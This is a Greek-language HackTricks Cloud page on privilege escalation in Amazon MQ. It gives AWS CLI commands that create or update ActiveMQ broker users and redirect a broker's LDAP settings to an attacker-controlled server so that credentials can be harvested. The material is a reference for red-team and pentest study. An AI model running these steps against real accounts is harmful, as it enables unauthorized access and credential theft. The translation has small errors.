# AWS - MQ Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## MQ

Για περισσότερες πληροφορίες σχετικά με το MQ, ελέγξτε:

{% content-ref url="../aws-services/aws-mq-enum.md" %}
[aws-mq-enum.md](../aws-services/aws-mq-enum.md)
{% endcontent-ref %}

### `mq:ListBrokers`, `mq:CreateUser`

Με αυτές τις άδειες μπορείτε να **δημιουργήσετε έναν νέο χρήστη σε έναν broker ActimeMQ** (αυτό δεν λειτουργεί σε RabbitMQ):

{% code overflow="wrap" %}
```bash
aws mq list-brokers
aws mq create-user --broker-id <value> --console-access --password <value> --username <value>
```
{% endcode %}

**Πιθανές Επιπτώσεις:** Πρόσβαση σε ευαίσθητες πληροφορίες μέσω του ActiveMQ

### `mq:ListBrokers`, `mq:ListUsers`, `mq:UpdateUser`

Με αυτές τις άδειες μπορείτε να **δημιουργήσετε έναν νέο χρήστη σε έναν ActimeMQ broker** (αυτό δεν λειτουργεί στο RabbitMQ):

{% code overflow="wrap" %}
```bash
aws mq list-brokers
aws mq list-users --broker-id <value>
aws mq update-user --broker-id <value> --console-access --password <value> --username <value>
```
{% endcode %}

**Πιθανές Επιπτώσεις:** Πρόσβαση σε ευαίσθητες πληροφορίες μέσω του ActiveMQ

### `mq:ListBrokers`, `mq:UpdateBroker`

Εάν ένας broker χρησιμοποιεί **LDAP** για εξουσιοδότηση με το **ActiveMQ**. Είναι δυνατόν να **αλλάξει** την **διαμόρφωση** του διακομιστή LDAP που χρησιμοποιείται σε **έναν που ελέγχεται από τον επιτιθέμενο**. Με αυτόν τον τρόπο, ο επιτιθέμενος θα είναι σε θέση να **κλέψει όλα τα διαπιστευτήρια που αποστέλλονται μέσω του LDAP**.
```bash
aws mq list-brokers
aws mq update-broker --broker-id <value> --ldap-server-metadata=...
```
Αν μπορούσατε με κάποιον τρόπο να βρείτε τα αρχικά διαπιστευτήρια που χρησιμοποιήθηκαν από το ActiveMQ, θα μπορούσατε να εκτελέσετε μια MitM, να κλέψετε τα διαπιστευτήρια, να τα χρησιμοποιήσετε στον αρχικό διακομιστή και να στείλετε την απάντηση (ίσως απλά επαναχρησιμοποιώντας τα κλεμμένα διαπιστευτήρια να μπορούσατε να το κάνετε αυτό).

**Πιθανές Επιπτώσεις:** Κλοπή διαπιστευτηρίων ActiveMQ

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
